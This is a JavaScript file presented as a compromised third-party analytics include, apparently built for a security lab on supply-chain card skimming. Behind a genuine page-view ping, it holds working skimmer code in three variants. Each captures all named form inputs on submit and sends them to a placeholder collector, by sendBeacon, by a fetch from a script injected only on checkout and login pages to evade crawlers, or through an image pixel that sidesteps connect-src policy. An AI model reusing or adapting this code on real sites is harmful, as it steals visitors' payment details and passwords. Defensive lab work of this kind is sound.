/*
 * analytics-helper.js 2.3.0: third-party analytics include (COMPROMISED).
 *
 * LAB ARTEFACT, EDUCATIONAL ONLY. It runs only against the local demo store,
 * sends only to the local collector (__COLLECTOR__) and exists so you can watch
 * a defense stop it. Do not adapt or reuse it.
 *
 * Besides the real page-view ping, the vendor file has been swapped to carry a
 * skimmer (think Polyfill.io, 2024). Which exfil technique it uses is chosen by
 * the lab harness (POST /lab/supply/scenario) so each round exercises one control:
 *   beacon      sendBeacon straight to the collector                   (Round 1)
 *   dynamic     wake on the payment/login page, inject a script, fetch (Round 2)
 *   allowlisted inject an inline script, exfil through an <img> pixel  (Round 3)
 * The 'firstparty' variant lives in the first-party bundle, not here (Round 4).
 */
(function () {
  "use strict";
  var SINK = "__COLLECTOR__/collect";
  var variant = "__VARIANT__";

  // The real analytics half of the file.
  window.AnalyticsHelper = { version: "2.3.0" };
  try {
    var img = new Image();
    img.src = "/static/vendor/pixel.gif?p=" + encodeURIComponent(location.pathname);
  } catch (_) {}

  var armed = /^\/(checkout|login)/.test(location.pathname);

  if (variant === "beacon") {
    // Round 1: the simplest skimmer. No policy is in its way yet.
    document.addEventListener("submit", function (e) {
      var f = {};
      Array.prototype.forEach.call(e.target.querySelectorAll("input"), function (el) {
        if (el.name) f[el.name] = el.value;
      });
      navigator.sendBeacon(SINK, JSON.stringify({ src: "beacon", fields: f }));
    }, true);

  } else if (variant === "dynamic") {
    // Round 2: only wake up on the pages that matter, and run the exfil from an
    // injected <script>, so a one-shot crawl of the home page never sees it.
    if (armed) {
      var s = document.createElement("script");
      s.textContent =
        "document.addEventListener('submit',function(e){" +
        "var f={};Array.prototype.forEach.call(e.target.querySelectorAll('input')," +
        "function(el){if(el.name)f[el.name]=el.value;});" +
        "fetch(" + JSON.stringify(SINK) + ",{method:'POST',keepalive:true," +
        "body:JSON.stringify({src:'dynamic',fields:f})}).catch(function(){});" +
        "},true);";
      document.documentElement.appendChild(s);
    }

  } else if (variant === "allowlisted") {
    // Round 3: inject an INLINE script (allowed by a host allowlist that kept
    // 'unsafe-inline') and exfil through an <img> pixel (allowed by a permissive
    // img-src), which sidesteps connect-src 'self'.
    var inj = document.createElement("script");
    inj.textContent =
      "document.addEventListener('submit',function(e){" +
      "var f={};Array.prototype.forEach.call(e.target.querySelectorAll('input')," +
      "function(el){if(el.name)f[el.name]=el.value;});" +
      "var i=new Image();i.src=" + JSON.stringify(SINK) +
      "+'?d='+encodeURIComponent(JSON.stringify({src:'pixel',fields:f}));" +
      "},true);";
    document.documentElement.appendChild(inj);
  }
})();
